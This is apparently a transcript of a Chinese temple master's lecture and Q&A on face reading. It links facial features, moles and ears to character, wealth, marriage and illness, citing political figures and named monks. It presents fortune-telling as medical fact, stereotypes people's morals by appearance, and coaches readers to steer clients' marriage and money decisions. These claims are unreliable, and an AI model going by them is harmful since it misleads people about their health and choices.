最佳的眉间距是一个半指头的宽度，这里是指每个人自己食指的宽度，而非他人的手指。眉间距超过自己的两个指头的宽度，就过宽了，这种人的心量太大，大的程度可以用没心没肝没肺来形容。眉间距太宽的人，一到关键时刻就变得没主张、左右摇摆，本来他有自己的道理和主张，但关键时候会觉得谁说的都有道理，就没主见了。这种人无论你对他多好或多坏，他都无动于衷，非常像个休闲者的状态：对他好，也不感恩；对他坏，也不报复。他的心量大的像宇宙一样，他的东西、衣服、乃至饭，你夺就夺了，穿就穿了，吃就吃了，他不会生你的气，也不会报复你。这种人，人品非常过关，靠得住，但做事时会把人气死。他不会故意背叛任何人，但他会因为糊涂而做错事，变相的背叛。比如，你跟这种人合作，刚开始你跟他说该怎样，他听了觉得很有道理，两个人达成协议了。过后他自己再一想或者又听别人一说，觉得有理，就觉得你讲的没道理了，于是就不按原来说好的去做了，他觉得他有他的道理，绝对不是背叛你。眉间距太宽的人不会对自己的主张和决定以一贯之，经常会换来换去，无法做到始终不变。 再看眉尾。如果眉尾宽，像扫把一样，代表后劲无穷、精力过人；如果眉尾窄，眉头宽，表示有头无尾；如果眉尾像扫把，眉头像簪子，意味着起步很低，但往后越做越大，实力越来越强。这种人注重用实际行动说话，有后劲；如果眉头宽，眉尾低，这种人喜欢大包大揽，说的很好，过段时间就没消息了；眉毛往上翘的人非常有胆识、魄力，或者说比较自我、刚愎自用；如果眉毛向下垂，就是好好先生，谁也不得罪，这种人往往跟风从云、不容易坚持原则；如果眉毛超过眼睛，这种人的兄弟姊妹最少在四个以上，有句话：眉毛出眼角，兄弟坐半桌，当然现在实行计划生育，坐不到半桌了，但从另一个角度变相地讲，这种人尽管没有同胞兄弟，但一定有几个铁杆、生死兄弟，因为这种人具有拉帮结派的个性，喜欢拜兄弟，他内在有这股气，不做就会躁动不舒服，直到做完了，内在的气才能平息；若眉毛短，不过眼角，兄弟姊妹可能只有两、三个。 再看太阳穴。两个太阳穴都塌进去的人，男女异性缘特别多，但这些异性缘又都会带来不好的、惨败的结果，如果太阳穴鼓鼓的，异性缘就特别好，且都是助成好事、得力的、给人带来好结果的异性缘。 再看眉毛和眼睛之间的上眼袋，又名眼泡。眼泡是人的田宅宫，代表田宅和财富，如果眉毛特别压眼泡，很窄，间距不够一指宽（这里也是指每个人自己的食指），表明这个人没有田宅，即没有财富来源。眼泡够宽，则表示有田宅、财富，眼泡宽到足以放下一个指头，代表此人的财富不可计量，至于这些财富是否存得住，就要再往下看。如果眼泡又鼓又宽阔，再加上鼻子不露孔，说明此人田宅很好，而且能储存进来。何为鼻不露孔呢?一个人保持正常平视时，对方只看到他的鼻子，而看不到鼻孔。平视的标准是将后脖子挨着后衣领——如果头一低，后面就有空隙；一抬头，又把衣领压住了，平视就是保持后脖子刚刚挨到后衣领的位置。如果一个人保持平视，对方能看到他的鼻孔，即使他的眼泡长得再好，钱财也存不住，通常称之为朝天孔。 一个人存不存得住财，首先要看这个人有没有财，如果又露鼻孔又没财，就会一辈子受贫穷。如果，即使露鼻孔，但田宅宫很好，一辈子也会很富有，属于人死钱也花光的人，这样最好，而非人还没死，钱就花光了。 如果一个人的田宅宫长得圆润光滑，但上面长了个痣，就将田宅宫全部破坏了，就像一个人的额头长的很好——光滑、圆润，但上面长了个痣便破坏了额头的格局。如果眉头、眉尾、眉中长痣，都是好痣，这种痣比较招财，或者说招人气。 古人比喻骨代表山的石头和气势，一个人有无气势，就看他的骨头。肉代表山上的土壤，山能不能生长万物、隐藏万物，就看有没有土。如果有土，够肥沃，就能长出参天大木和茂盛的灌木。桂林的山就是有骨无肉——没有土就长不成古树，因此，桂林就不能藏风纳气。这种格局就很少出达官显贵富豪，即使出了大官或大富翁，发展到一定程度，一定会出问题，因为藏不住。通常大富大贵之人都是”山”有气势——很厚重，骨头和肉都很协调匀称。 身上的毛发，包括腋下毛发的多少，代表山上的灌木茂盛与否；脸上是否长痣，代表山上有无古松古柏。比如毛泽东脸上的大黑痣，代表大山上有棵千年古松，当我们行驶在公路上，大山上的这棵大树就能令我们一眼望见。一棵引人注目的大树有可能成为神树，如果再有一些鸟昼夜落在这棵大树上，这棵树就成了受人祭拜的招财树。 脸上的痣，如果长在眉毛这一带或长在下巴上、嘴下，都是好痣；长在颧骨上，是颧而无权，即没有权力；长在上嘴唇上面，代表财富进不来，因为嘴巴代表船；长在眼睛下，则是泪痣；若长在太阳穴上，一定会因为男女异性关系而身败名裂，说的再严重一点，就是家破人亡；如果长在鼻梁中间，表示在四十四岁前后这三年中一定会大病一场，因为鼻根代表龙脉——龙脊，若此处长个痣，就仿佛钉了个钉子，不仅四十三、四十四、四十五岁这三年中会大病一场，而且还会影响并导致事业下跌。 再看眼睛。”眼、睛”意味着两个部位，眼是整体，睛是中间的黑点，即瞳仁，看眼睛通常看眼里的瞳仁——睛。古人喻言：”睛如点漆，必是大贵之人”，即是说睛黑的像油漆一样乌黑发亮的人，必是奇人。睛代表人的肾阳，如果一个人纵欲过度，他的睛一定处于游离无神状态，暗淡无光、茫茫然。一个人若禁欲禁得比较好，一定是睛如黑漆。古时候张良向黄石公学艺，据说张良长得很丑，五官没一个好的，但黄石公一看张良睛如点漆，必是奇人异士，一下子就看中了张良，并把自己的兵书、兵法悉数传给了张良，日后张良辅佐刘邦打下了天下。 眼睛是用来看东西的，向外看时以不露两边的眼白为上眼睛。 说话时，如果向别人展现出来的大部分是白眼球，而不是黑眼珠，就属于过于外露，从眼相上讲，属于破败之相。白眼球多意味着此人做事无定性、变化多端，而且跟他讲好的事，当面答应，背后又改变，有奶便是娘，对谁都不忠，永远养不了家，因为黑眼球代表肾，他的肾气未占主导地位。肾气占主导地位的人，其意志力就非常坚定，一诺千金，甚至吐口痰也能入木三分。人的五官与五行、五气有着绝对的关系，大家不懂医学原理，就以为这是迷信，其实既不迷信也不玄，它和医学息息相关。 接下来看白眼珠。白眼球以白得发青为上好，就是说瞳仁两边白的部分不是纯白，而是白的有点微微泛青，说明此人的肝气比较舒展，如果白眼球上布满了血丝，代表肝气郁结，这种人脾气非常暴躁，易头脑发热而做出不理智的决定。 如果眼角往下拉，眼尾上翘，即所谓的凤眼，意味着大富大贵。凤眼在古时候，男的可做诸侯，女的可做娘娘。但是新社会不可能有那么多娘娘，但它仍然代表了大富大贵，意味着此人在行业里可以称王：当和尚是和尚中的王；经商是商界的王；画画是画界的王；搞音乐是音乐界之王。各行各业都有王。 如果眼睛前面大后面小，即通常讲的三角眼，这种人比较狡猾阴险，说的好听一点，很有智慧。但他的智慧不是用在救国救民、而是用在整人上，不是光明磊落，而是暗地里使坏。人的眼睛一般都是前面大后面小，随着年龄的增长肌肉松弛下垂，到了六十岁就变成了三角眼，到这个年龄就另当别论了，不能再说阴险狡猾了。如果一个人刚刚四十岁，或者还没到四十岁就已经是三角眼，这个人肯定奸诈阴险。 如果眼睛后面相对宽一点，前面相对窄一点，这种人做事就会颠三倒四，从来没有章法，不过一般眼睛后面宽前面小的人很少。 如果眼睛比较大，又有神，这种人的智慧会用在阳光、正的一面，喜欢出谋划策做一些利国利民的事，而非出谋划策去整人。 如果眼睛是圆的，这种人通常比较直来直去，大大咧咧。 如果眼睛比较窄、细长细长眯成一条线，这种人非常睿智、冷静、理智，无论是交友投资，还是下赌注，都特别准。相反，眼睛圆的人，看什么都不准，投什么都不中，这种人缺乏理智，脑袋一热，想怎么说就怎么说，想怎么做就怎么做，任性而为，不会分析判断。 再来看两眼之间的鼻子根。鼻子根和鼻头要垂直在一个平面上。古人形容”鼻若悬胆”——鼻头像从鼻根垂直掉下来一样，鼻若悬胆的人通常做事比较有毅力、有胆识，不会朝令夕改，或者做一些不三不四不切实际的事。这种人不会轻易出手，一旦出手便是重量级。这种人迟早会进入上层社会，说的再直白点，就是一定会进入他所在行业的上层。 如果一个人是塌鼻子或断鼻子，一般来说，从四十一岁到四十三岁这三年间，无论身体、事业，还是感情，都处在最低谷，到了四十四岁（中间这个地方）才开始有转机，步入四十五岁，即与颧骨平行时就开始好转。如果鼻子看起来比较顺溜，没有坎（像台阶一样），这种人在这三年当中，无论感情、事业等都呈上升趋势。这时你告诉他该投资就投资，该当官去当官，都不会付之东流，一定成功。如果是塌鼻子或断鼻子，这三年就要稳住现状，最好不出手，不要投资。事实上，他稳都稳不住，这三年一定会跌下去，之前所做的一切都会付之东流，等过了这三年，他的事业、感情，一切都要重起炉灶，另开张，重新开始。 如果一个人是塌鼻子或断鼻子，但额头很好，宽阔饱满，这种人肯定少年得志，四十一岁前会走十年大运，但到了四十一至四十四岁这四年期间就要跌下去，从四十五岁又开始走第二期的大运。如果鼻根是平着顺下来，就不存在第一个大运和第二个大运，这种人即使到了四十五岁，走的还是第一个大运，始终是上升趋势。 问：我的鼻子不是直的，好像有一个小包？ 师：对。很多人鼻梁中间有个包鼓出来。这个包意味着四十四岁时一定会行大运，如果是当官的就会升官，如果是做生意的，四十四岁时开始积累财富。若额头长得好，四十四岁之前就已经发财并积累了第一桶金，若加上鼻梁中间又鼓出来，显得很饱满，那么到四十四岁时，他生命中的第二桶金又开始聚集了。 如果鼻梁中间的鼓包中正不歪，这桶金就聚得住，如果歪了，就会得而复失，即所谓的”东边失火”，又要丢出去。 问：师父，我这个眉毛断了是怎么说？ 师：哪断了？你这个不算。 问：小时候从墙上栽下来摔断了。 师：这个不算。他的眉属于清秀之眉，顾名思义，其内在非常有灵气，他不是举一反三，可能是举一悟十。 问：按师父的说法来看，地格宽能抓权，但我看康熙皇帝的画像，他是尖下颌啊。 师：你说的非常对。 问：康熙的面相是甲字啊，居然能做皇帝？ 师：这种人一定是福犀灌顶，鼻若悬胆。他的印堂、山根、准头三者一定是在一条线上，再加上这样的尖下巴，是风水回笼。只有两种下巴是好的，一种是鼓起来、方圆形的下巴，这种下巴为上好下巴；另一种是尖下巴，但一定是兜起来的，就像顿翰的，这种下巴称为风水回笼，所谓”下巴兜兜，晚景无忧”。所以，你说的康熙虽然脸上单薄没肉，但我敢肯定，他的脸长得非常清透干净。 问：有人说，康熙叫康麻子？ 师：哦，是康麻子！看我是怎么辩的。这时就不要单看他的五官形状，也不要看他五官的气，而要看他的神韵了。所以说，低等的看五官；中等的看气；上等的看神。康熙一定是气定神闲，静如睡龙。 问：师父，我看东华寺里MD师的神最好，最清透。 师：对，他整个人很清透。如果拿他和CE、CF、DY，还有NM比，他们是截然不同的两种气，MD是清、透、秀，他们几个的气有点浊。东华寺五官格局长得最好的是常法，他是81年生，属鸡，但还不能只看格局，还要看他的气，他的气就比较浊，所以五官好不如气好，气好不如神好。 问：气色可以调过来吗？ 师：可以调。 问：CE的气色好像比以前好多了。 师：CE是这两年才变过来的。前几年他的气非常污浊，这两年开始脱胎换骨，已经起了很大的变化。再看MD，他的气比较清透，像块没有瑕疵的玉，这种人就是一闻千悟，很有灵气，他适合给人出点子，上传下达。他的现状还有点轻浮，因为年龄还小，所以要另当别论，如果到了四十岁还是这样，那就是破败之相了。MD今年二十几啊？ 答：二十五，属龙的。 师:二十五啊，相对而言，应该到了改变的时候了。MD现在过于活，就是浮了，若二十岁左右这么活还算正常，因为不同的年龄，气的状态也不同。气是看得见的，它会通过一定的形像与格局展现出来。所以，MD从现在开始要慢慢学着稳了，先慢慢装着稳，装上三年就开始真稳了。 我们再来看鼻子。如果一个人的鼻子上面细——鼻根细，越到鼻头越大，就像个三角形，又称蒜头鼻，这种人精力过人，胆识过人，贪心也过人。 如果鼻子从鼻根到鼻头的宽度基本一致，古人形容像葱头，也称葱头鼻——即葱白。蒜头鼻与葱白鼻的区别在于：蒜头鼻的人胆识过人，贪心也过人，也可以说肥鼻子人的财富相对比较多；葱头鼻的人，文学修养和政治素养相对比较好，有政治嗅觉，文学层次较高。如果是蒜头鼻，前面一个大疙瘩，后面细细的，这种人喜欢掌权，好贪，胆量大，喜异性。 如果鼻子不是笔直的，而是打弯的，就要看鼻子在哪里弯了，如果是中间弯，此人在四十四岁一定要大病；如果是根部弯，可能在四十一岁大病。如果鼻子往左边歪，意味着父亲先亡或身体不好；如果往右边歪，就是母亲身体不好，或者说母亲先亡。为什么呢？如果左边的气足，就一定往右边歪，右边的血足，一定是往左边歪，左边代表父，右边代表母。 下来看鼻子两边的颧骨。一般来说，一个人的颧骨与五官要协调，不能颧骨像两个大包，否则不管男女都比较孤僻，容易和配偶离婚。如果颧骨太大，大的出奇就会丧偶；如果颧骨不是太大，就是分离之相，就像平象的颧骨，就比较大，他一定会与配偶分离，一定是二婚。不管男女，只要是颧骨大的，一定是二婚，即使不结婚只谈恋爱，也一定是两次以上。假如你们出去给人看相，如果这个人的颧骨大，你们就可以肯定地告诉他，谈恋爱的话，谈一个不行，要谈两个以上，肯定一下子就说中了。如果这个人还在谈恋爱，你说要谈两个以上；如果他说已经结婚了，那肯定是两次婚姻。 颧骨大是孤寡之相，这种人比较犯孤，只活在自我当中，在他心中只有自己的感觉、自己的思想，从不考虑别人的意见，也从来不听别人的意见，无论别人怎么跟他讲，他嘴巴上说好好好，行为上还是按自己的一套去做，非常独断专行。所以这种人跟谁都合不来，就是找了老婆或异性朋友也会分手，因为他不会包容身边的人。 问：如果出家人有这么大的颧骨呢？ 师：一样犯孤。 问：那当家师呢? 师：他就不这么看了。他的整个头和脸都很瘦，是瘦形的，这种不属于高颧骨，所以要另当别论。像他这么瘦，一般有两种情况：一种是脾胃不好，如果一个人过去胖，但某个阶段脾胃不好，人就会瘦；还有一种就是这种体型。如果一个人从没胖过，一直很瘦，就算脾胃好，身体调理得很好，也不会胖，只是相对的饱满一点点，当家师就属于这种瘦体型人，他属于骨感型。骨头大的人属于清贵之相——骨为贵，肉为富，有肉有骨富贵相。所以，瘦不能露骨，露骨可以，但必须有精神；一个人很肥，但肥而不臃肿，不散、不堵也是富贵之相。 两边的颧骨，如果一高一低，或者一大一小，是因为内在的两股气不匀称、不协调：左边颧骨高的人气比较足，气足的人魄力过人，胆识过人，勇敢过人，或者说比较容易冲动；右边颧骨高的人血比较足，血足的人，稳重有余，行动不够，魄力不够。 问：师父，刚才你讲到眉头，我想到国家主席习近平。您说眉头越大越宽，代表着在一个行业的影响力和名气。但我发现习主席的眉头和正常人差不多，并不是那么大，那么广，他竟然能做国家主席，而且是世界级的人物，这是为什么呢？ 师：他就是悬胆鼻，而且地格好，他有帝王的鼻和帝王的地格。 问：要看整个格局是吧？ 师：对，还要看他的耳，古人讲，两耳插天（就是两只耳朵往外插天），贵不可言；两耳垂肩，富不可言。但人的耳朵不可能插天，也不可能垂肩，这是一种夸张的形容。那究竟是怎样呢？就是下耳垂和嘴角平行，才是富不可言；上耳廓齐眉，谓贵不可言。古人形容贵用”得天独厚”，得天是指天庭，独厚即独一无二——稀为贵；得地讲的是鼻子以下的地格，得地就富有，地格比较宽阔的人就有钱财、奴仆、权力、后代等。凡是知名人士，无论是明星，还是出自政界、文艺界、宗教界的名人，其上耳廓肯定高。一个不出名但很有钱的人，即做生意发大财的人，其耳垂肯定向下垂。如果耳朵上插天，下垂肩，就会又富又贵。 大家可以根据这些给人看相，看相时可以问他想求什么。比如唱歌的想出名，求学的想考清华，当官的想升官，总之，要问他到底是喜欢名，还是喜欢利，名是名，利是利，要搞清楚。如果这个人的上耳廓很高，与眉齐，或者高过了眉，你就可以大胆地肯定他求取功名没问题，让他去求取功名绝对不会错；如果他的上耳廓很低，与眼睛都未能齐平，更别说与眉平了，或者刚刚与眼睛平，你就不要让他求功名了。如果这个人说他想投资，想发大财，就要看他有没有耳垂，或者看他的耳垂有没有到嘴角，如果耳垂到嘴边了，就让他大胆的做生意，他闭着眼睛投资都能赚到钱。如果耳垂没垂到嘴角，而是刚到鼻头的位置，就告诉他一辈子别追求钱财，没有的。就让他老老实实打工，老老实实做好眼前的事足矣。所以说：”耳不过眉，莫问功名，垂不齐嘴，莫问财富”。 鼻子大有财富，但如果露鼻孔，即使有财富，也留不下来。这种人是自己一人有福，一人受用——吃光、喝光、玩光、败光，这种人不会给身边的人带来一点实惠，谁都享不到他的福。 如果一个人的耳朵是招风耳，这种人就爱惹是生非，谁跟他做朋友、与他共事，谁就会被牵连，而且被牵连得破败，跟这种招风耳的人合作，不仅影响到自己，还会影响到自己的事业破败。一个人，如果从正面看他，只见其面不见其耳，这种人纵然遇到再大的凶险或灾难，都能逢凶化吉，遇到贵人。大富大贵之人一定是见其面不见其耳。如果一个人的耳朵相对有点儿招，上面还有一个大黑痣，那就另当别论了。耳朵上有大黑痣，纵然有点兜风耳，也能逢凶化吉。 问：师父，我们东华寺最典型的招风耳是HH师。 师：他是有一点。这种人做事难成事，即便成事，也是一路是非不断。但是，如果一个人的耳朵很”招风”，但他的地格很好，也能成事，所以要分开来看。 问：那HH师这样的耳朵没什么问题吧？ 师：他是相对有点招，但他的地格和额头相对而言还比较协调。我们看一个人的地格与额头，不是说拿谁来做标准，而是看这个人本身的地格和天庭是否协调，如果协调就不是破败之相。 问：师父，如果男人长女人相，女人长男人相，而且这个人比较有志向，是一种贵相吗？ 师：是贵相。不仅大富大贵，且能成事。 问：比如周总理？ 师：毛主席是典型的。 问：周恩来二十几岁的时候也是这样啊。 师：毛主席是典型的女人相。为什么他是男人，长得却像个女人呢？因为他内在的阴阳平衡了，所以阴性的女性力量也调动、发挥出来。如果一个男人看起来男人味十足，说明他只发挥了百分之五十的力量，就是只发挥了男性的力量，另外还有百分之五十的阴性力量，即女性力量尚未调动出来，还没苏醒，没有发挥。如果男人带一半的女人相，女人带一半的男人相，这种人最厉害。这种人百分之五十的男性力量、男性基因调动使用了，百分之五十的女性基因也在发挥作用，他内在的力量是平衡的，因为两股力量都在调动使用，所以最厉害。并非说女人修行要变成大丈夫相，它是指女性要把内在另外一半男性力量唤醒，才能成道。女人修行要修的像个老头子，老和尚则要像个老太太，内在的阴阳平衡了才能成道。 问：师父，狮子大回头，怎么讲？ 师：狮子大回头啊，比如说林彪。 问：对，就是林彪。 师：林彪的头能够转一百八十度到后面，看到自己的后背，我们的头最多转九十度。 问：看他的面相，根本就不像个元帅。 师：林彪小的时候特别调皮，村里人都说他一无是处，绝对是个败家子，当地的风水先生、看相先生也说他不行。林彪当时十二、三岁，调皮得很，听说看相算命的先生说他不好，于是有一天，天不亮，他就跑到算命先生每天摆地摊的地方拉了一泡屎，到了八、九点钟，算命先生去摆摊，一看，哎呦，一条龙盘在那里，算命先生赶紧给它烧香，周围的人就问他，为什么给一堆屎烧香？先生说，这是一条龙盘在这里，此人将来必能登基，即登皇位啊。林彪就问算命先生，知不知道是谁拉的，算命先生就问，莫非是你拉的？林彪说，你们都说我一无是处，这就是我拉的。那个先生马上给林彪作揖鞠躬，说此人必是帝王之命，能够统领三军。 问：后来他做了国家副主席。 师：对，他做了国家副主席。看他的相，一点福没有，还做了副主席。在农村，通常拉大便是蹲在地上，如果一个人气很足，他拉的大便就是盘旋状的，不会散落无形。城市里坐抽水马桶，就不会有这种现象。 问：有一种形状，是三角形的？ 师：对，林彪当时的大便就是这种形状，所以风水先生一看像条盘龙，林彪后来果然得势了，因为他的内在有龙盘之气，所以他拉的大便就是那样盘着的。有这种气在体内运转的人，一定有大抱负。 再回头讲一下鼻子。鼻头的两边是鼻翼，还有鼻孔，一般鼻翼和鼻孔连在一起讲。鼻孔大、鼻翼开的人有胆识、魄力，很大气。如果鼻翼、鼻孔都很小，这种人就很小气。为什么鼻孔的大小与大气小气有关呢？鼻孔大意味着肺活量大，肺活量大，必然胆量大、气宇轩昂，当然就大气。而鼻孔小的人，肺活量小，胆量也小。这种人给人钱也小气，包个红包百十块，不像大鼻孔的人，要么不包，要包就是大数。鼻翼大还代表理想大、抱负大。 如果鼻头有点勾，像鹰钩，不是西方人的那种鹰钩鼻，只是鼻尖有一点点勾，这种人相当有智慧，而且有艺术细胞，审美观很强。如果鼻子很大，但没有气势，像一堆牛屎一样粘在脸上，秃塌塌的，不能挺立，这就是塌鼻子，尽管很大，也意味着一辈子受穷。 还有酒糟鼻，鼻子上看似有很多窟窿，像桔子皮一样。若是酒糟鼻，即使再高、再大，也是贫穷败坏之相。鼻子一定要圆润、丰泽、有亮光，不能有麻点。蜂窝鼻、酒糟鼻都不好，它与肾和肺有关系。肾水不足，肺会燥热，鼻孔就发红。社会上有种人酒色过度，伤了肾和肺的元气，就容易上虚火，鼻子便会发红。 下面谈嘴巴。古人在相上把嘴叫船，下嘴唇是船底、船帮，上嘴唇代表船里装的财富。如果上嘴唇很薄，下嘴唇很厚，意味着船很好，但船是空的；如果上嘴唇厚，下嘴唇薄，意味着船里装满了东西，但船底薄，经不起大风大浪的折腾。上嘴唇薄的人善说；唇厚的人木讷，寡言少语，保密性强。 问：如果都很厚呢？ 师：上下嘴唇都厚是上上之相。 问：上上之相，适合做什么？ 师：先不谈他适合做什么。嘴是船，表示储纳。如果上嘴唇和下嘴唇都厚，说明这个船是满载。 问：如果嘴唇厚，但嘴不大呢？ 师：这要看嘴角是不是向下拖。嘴角下垂，叫做翻船，若是翻船，不管上嘴唇厚与薄，都没有意义了。如果嘴角是平的，船没翻，就要看嘴唇厚不厚，如果上嘴唇薄，说明是个空船——即穷光蛋。如果嘴角上扬，上嘴唇厚，就是富贵之相，说明船里面装满了东西，一辈子无论到哪儿，都不愁吃喝，上嘴唇厚还代表人有口德，不说别人是非。如果上嘴唇薄，又往外翻，叫做吹火铜嘴；这种人，第一爱说别人是非，第二有多少财产都会把它吃光、吹光、败光。如果上下嘴唇都向里扣，向里面绷，这种人一定忠诚、讲信用，对他人的秘密能守口如瓶。如果上下嘴唇都往外翻，也叫吹火铜嘴，什么事都不能跟这种人说，就像个小广播，他马上会传出去。这种人喜欢惹是生非、传播是非，没事也要制造一些是非。如果有什么事想利用一下他的嘴巴，让他传播一下，那是再好不过的。为什么这种人的嘴唇往外翻，牙也往外呲，就是从小到大爱说话，气往外冲多了，牙齿就往外长，嘴唇也往外翻。如果从小就不爱说话，嘴唇一定是绷得紧紧的，牙齿往里扣，嘴唇也往里扣。因为不爱说话，气就不往外放，而往肚子里咽，往丹田沉，所有的苦水都往肚子里咽。这种人长大以后非常讲信用，不爱说是非。开口便讲真话，否则，宁可不说话，也不会说假话。 接下来谈嘴巴的两边——腮。腮又称为奴仆宫，有无权力，有没有人，就看腮帮子是否饱满。如果两腮瘪瘪的，就不要指望当领导拥有权力，腮帮子鼓出来，才能掌权。 奴仆宫旁边是法令线——从鼻翼两边分出来的就是法令线。有法令线的人有权力，但不代表有奴仆，奴仆是心甘情愿为他做事。有法令线只代表这个人有手腕、能力。一个人如果有权力，还有人为他服务，那就要看这些人是他运用权力和手腕抓来的，还是自愿的、死心蹋地给他做奴仆，使他获得权力，要两方面综合来看。 所以，看帝王将相或统领三军的人，第一有法令线，第二有奴仆宫，即两个腮帮子都是鼓鼓的，即说明此人不仅有能力，手下还有一帮铁杆兄弟、敢死队，愿意在他手下鞍前马后俯首称臣。 还有一种法令线是从嘴角出来的，上面从鼻翼两侧出来两条法令线，形成一个八字形，从嘴角两侧再出来两条法令线，又形成一个八字形——双八字，即权上加权，意味着老来又得权。看中央常委，他们的嘴角边、脸上都有两个八字，老了又升官，权上加权。 接下来我们讲下巴。有种人的下巴中间像开了个坑 ，这种人晚年身体不好，因为地格破坏了，所以身体、事业到了晚年就会大滑坡。若下巴中间没有这种缝，没有开，晚年在身体、事业等方面都不会下滑，老了也能保持原来的度，即便死了也死在这个度上，不至于事业先下滑，然后人才死，而且，即使人死了，他的事业也不会下滑。 剩下的时间由你们两个替大家提问。 问：师父，有的人脸上有酒窝，腮帮子上有个酒窝，代表什么呢？ 师：这种人内心容易生喜悦之心。内在充满欢喜和阳光的人，在发育的时候经常笑，善于笑，喜欢笑，就形成了酒窝。这种人特别有人缘，大家都喜欢跟他打交道，这也属于贵相。 问：有的只有一个酒窝。 师：如果只有一个酒窝，在左边，就是气足；在右边，就是血足。因为左右两边分别代表气血。有的人，五官发育的一边大一些，高一些，另一边低一些，小一些，这就是气足和血足不同造成的。拿我来讲，我是典型的左肩膀高，左边的五官相对发育的大一点；右肩膀低一点，这边的五官相对低一点，小一点。气足的人，相对而言比较勇敢，魄力会大一点，但容易冲动。颠倒过来，若是右边高、大，即血比较足。血足的人，涵养和脾气都比较好，能够受人气，不易冲动，很理智。 凡是左边高、左边大这种格局的人，在他的一生当中，必有一次破败，比如在感情或事业等方面。为何一定会破败呢？因为这种气足的人，一发火、头脑一热就不计后果，宁可不做这件事，也要出口气，话也要说出来。结果气出了，话说了，后果便无可挽回、悔之莫及了。因气足憋不住就要说、要干，说完、干完把人也得罪了，这就是”图一时之快，生百日之忧”。因此这种人的事业或感情都要从新再经历一次。如果血足——右边发育的大而高，别人把他的牙打掉了，他也不会吭声，他能把打落的牙和血吞下去，而不会流露出来。这种人，头脑不会发热，非常理智、稳健。 问：师父，还有一种人，眉骨高，怎么讲？ 师：有这种人，眉骨这个地方的骨头很大，这种人非常暴烈，在战争年代可能会成为一名武将。这种人好动拳头，不善动脑。而没有眉骨的人善用心计，不善用手脚。 问：师父，如果年轻人有眉骨，可以说是讲义气，或者说气魄大？ 师：任何事都要一分为二地看。这种人某些时候是讲义气，但更多时候是义气用事，喜欢打打杀杀。有时他的确很讲义气，因为这种人比较要强，好面子，喜欢当大哥。你若找到他，他为了保持大哥的形象，就会说，好，我帮你。这种人只要你称他一声”大哥”，他就是自己贴钱也要帮你。眉骨突出的人喜欢做老大。没有眉骨的人，你怎么称他”大哥”，他都不会上当、都没用，除非真的实实在在，他才愿意帮你。若是有眉骨的人，你就不用跟他来实在的，跟他来虚的，多叫几声”大哥”，在场合上抬一抬他，他就干了。 问：师父,这种人是不是在黑道上混得比较好？ 师:相对而言比较多。 问：师父，我曾看过一个人，在法令线上长了个很大的痣。痣上的毛很长，而且有很多根，看到他时先看到的是他的痣，然后才会注意到他的面相。 师：这就是前面说的，如果我们在高速公路上，看到远远的一座大山上有个千年古柏，非常引人注目。 答：是，一眼就看到了那个痣。 师：所以，当你看到这个人的时候，你没有先记住他的五官，而是先记住他的黑痣。如果痣不是长在法令线上，而是长在船底下，即下嘴唇下面，这就是大富大贵之相。痣长在法令线上是权而无权，意思是权力上面钉了一个钉子，即使有权力，也发挥不了，有人掣肘，他会生气。 问：就像那些傀儡皇帝？ 师：对对对，这个比喻非常好——傀儡皇帝，虽然有权力，但有人掣他的肘，让他发挥不了。 问：师父，关于痣，我曾听人讲，如果痣长在人的后面，特别是后脖子上，就如同龙背上钉了钉子；如果长在前胸，好像是胸有大志？ 师：古人把男人比喻成龙，女人比喻成凤。背上钉了个钉子，相当于爬墙虎背上被钉了钉子，不管它怎么摇头晃脑，也跑不了了。无论男女，背后长痣，都会很辛苦、操劳。若痣长在脊柱上，纵然有才华，有智慧，很能干，也不能得志，往往自己做啥不成啥；帮别人，帮谁，谁成功，不服气都不行。如果自己想立大旗，当老板，做帝王，那是根本实现不了的，因为”龙”被钉住了，是飞不起来的。但是不代表这种人不能辅佐别人成功。 问：师父，那把它点掉呢？ 问：就是斩草不除根？ 师：如果点掉，只能是好看一点，实际上不起作用。 问：因为他的气在？ 师：对，他体内的那股气还在。 问：师父，痣长在脚底心呢？ 师：痣长在脚底下，或者长在手掌心，必定掌大权、大印。 问：长在眉毛里呢？ 师：长在眉毛里代表有智慧，有眼光。 问：就像明星斯琴高娃? 师：她的长在眉尖上。我们寺庙里的本悟和妙自，他们俩个的痣长在两眉之间，目前痣很小，可能随着年龄增长，比如到了五、六十岁就会长得很大，古人比喻眉和眼都代表凤，痣长在两眉之间，意味着凤中间有个珠，叫做二凤戏珠，也叫二龙戏珠，还有二龙吐珠，二龙抢珠。如果痣长在两眉之间，还要区分是二龙戏珠，还是二龙抢珠，或二龙吐珠，这决定了一个人的命运。 问：师父，那要怎么看是戏、是吐、还是抢呢？ 师：这要看两眉的劲，即看眉毛是往里走，还是向后张。如果两条龙往一起走，可能就是抢；向后张，就是往外吐。如果向外吐，意味着这个人乐于奉献；如果是往一起走，意味着这种人比较贪婪。 问：师父，还有一种眉毛，里面有一根白色的，特别长，这说明什么呢？ 师：如果从五行上来讲，这代表肝胆湿热。肝胆湿热会导致鬓毛、眉毛、或者胡须有点发白。我就是这样，你们看我两边的鬓角就是白的，还有点白胡子，目前眉毛还没白。肝胆湿热的人容易激动、冲动，脑袋一发热就干了。这就是我刚才说过的那种人，看事情只看三五分，甚至只看两三分，看不透就不看了，先干了再说，边做边看。如果一个人的眉毛比较细、比较淡，事情看不准他是不会做的，有时即使看准了还不敢做，这种人顾虑太多。 问：师父，罗汉像的眉毛都是立着的。 师：这是因为古人为了追求画面协调，好看。实际上，罗汉是长寿之相，罗汉的眉毛很少往上翘，多数是向下垂的。但不否认有的人的眉毛往上翘，这代表此人肾的阳气足，阳气咋咋呼呼的炸开了。眉毛向下垂的人，代表肾阴足。肾阳足的人，眉毛向上翘，脾气大；肾阴足的人，眉毛向下垂，性格柔和，稳重。通常，吃素的人，肾的阳气相对比较足，眉毛往上翘；吃肉食的人，阴气比较足，眉毛是往下垂的，这些都跟我们的饮食结构和内在的气有关系。 问：师父，HH师的腮骨炸开了。 师：凡是做大官的人，如果站在他的后面、从背后看他的头，看到的是两个腮骨，这就是地格炸开腮骨的人，这种人特别有智慧，善于玩权术。 问：师父，你上次可不是这么说的。你上次说，这个炸开意味着越到老越好，是吗？ 